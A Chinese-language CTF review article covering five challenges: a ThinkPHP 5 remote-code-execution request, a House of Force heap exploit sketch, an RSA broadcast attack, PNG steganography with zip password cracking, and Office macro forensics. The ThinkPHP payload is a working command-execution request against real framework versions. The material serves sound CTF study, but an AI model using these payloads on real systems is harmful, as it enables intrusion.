# CTF 赛题精讲与实战复盘

> 剖析 5 道经典 CTF 题目，带你理解实战中的解题思维。

---

## 案例 1：ThinkPHP 5 RCE（Web）

**题目**：给定 ThinkPHP 5 站点，获取 /flag

**漏洞分析**：ThinkPHP 5.0.x~5.1.x 存在 `invokefunction` 驱动 RCE

**解题**：
```http
POST /index.php?s=index/Index/index HTTP/1.1
Content-Type: application/x-www-form-urlencoded

s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat /flag
```

**Takeaway**：CMS/框架漏洞 → 先查版本 → 搜索历史 CVE → PayloadsAllTheThings

## 案例 2：House of Force（PWN）

**题目**：glibc 2.23 堆题，可分配任意大小堆块

**原理**：通过溢出修改 top chunk size，下申请超大 chunk 后 top 移到任意位置

```python
# 1. 溢出修改 top chunk size
payload = b'A'*24 + p64(0xffffffffffffffff)
# 2. 计算偏移并 malloc 到目标
target = elf.symbols['__malloc_hook']
offset = target - (top_addr + 0x20)
malloc(offset)  # 触发 top 位移
# 3. 分配到 __malloc_hook 上写 one_gadget
malloc(p64(one_gadget))
```

**Takeaway**：CTF 堆题环境通常是特定 libc 版本，注意 `libc-database` 或 `libc-database.kliu.xyz`

## 案例 3：RSA 低指数广播攻击（Crypto）

**题目**：三组不同的 n 但是相同的 e=3，密文为同一消息

```python
# CRT 恢复明文
from gmpy2 import iroot

def crt_attack(ns, cs):
    N = 1
    for n in ns:
        N *= n
    result = 0
    for n, c in zip(ns, cs):
        Ni = N // n
        result += c * Ni * pow(Ni, -1, n)
    m = iroot(result % N, 3)
    return m[0]
```

**Takeaway**：e 小 + 多组相同明文 → 低指数广播攻击，经典 CTF 题型

## 案例 4：PNG LSB 隐写（Stego）

**题目**：一张风景图，题目描述 "Look deeper"

```bash
# 逐层检查
zsteg -a image.png
# [?] 120654 bytes of data at b1,rgb,lsb

# 提取数据
zsteg -e b1,rgb,lsb image.png > extracted.bin
# 提取后得到 flag.zip → 爆破密码
fcrackzip -u -D -p rockyou.txt flag.zip
```

**Takeaway**：LSB 隐写是最常见的图片隐写方式，zsteg 一步到位

## 案例 5：Office 宏钓鱼（Forensics）

**题目**：doc 文件，疑似包含恶意代码，找 C2 域名

```bash
# 提取宏
olevba malicious.doc > macro.txt
# 发现 VBA 代码中 base64 解码后包含 PowerShell 下载器
# C2: c2.malicious.com:8080

# 进一步分析
# NetworkMiner 分析 doc 生成时的 DNS 记录
tshark -r malicious.pcap -Y "dns" -T fields -e dns.qry.name | grep -v "\.local"
```

**Takeaway**：文档取证 → olevba（Macro）→ binwalk（嵌入文件）

## 复盘方法论

```
CTF 赛后一定做这三件事：
1. ✅ 重做一遍（不看 writeup）
2. 📝 整理笔记到自己的知识库
3. 🔄 把 Payload 存入 Personal Arsenal

每道题都要问自己：
- 这题的考点是什么？
- 我卡在哪一步？（知识盲区 / 工具不熟 / 思路不对）
- 同类题目还有哪些变体？
```

*上一篇：[CTF 工具箱与速查手册](06-ctf-toolkit.md)*
